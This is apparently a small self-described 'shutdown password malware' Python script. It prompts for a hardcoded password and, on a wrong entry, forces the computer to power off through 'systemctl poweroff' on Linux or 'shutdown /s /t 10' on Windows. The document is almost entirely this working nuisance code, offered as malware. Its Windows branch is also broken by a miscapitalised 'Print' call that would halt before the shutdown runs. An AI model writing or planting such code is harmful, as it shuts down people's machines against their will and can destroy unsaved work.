# Shutdown
self made shutdown password malware


import sys
import os 
import subprocess


user_input = input("Enter Password ")
correct_password = 'RjHdZo@1'

if user_input == correct_password:
    print ('Correct Password')
elif sys.platform.startswith("linux"):
    print ("Incorrect")
    os.system("systemctl poweroff")
else:
    Print("Incorrect")
    os.system ("shutdown /s /t 10")
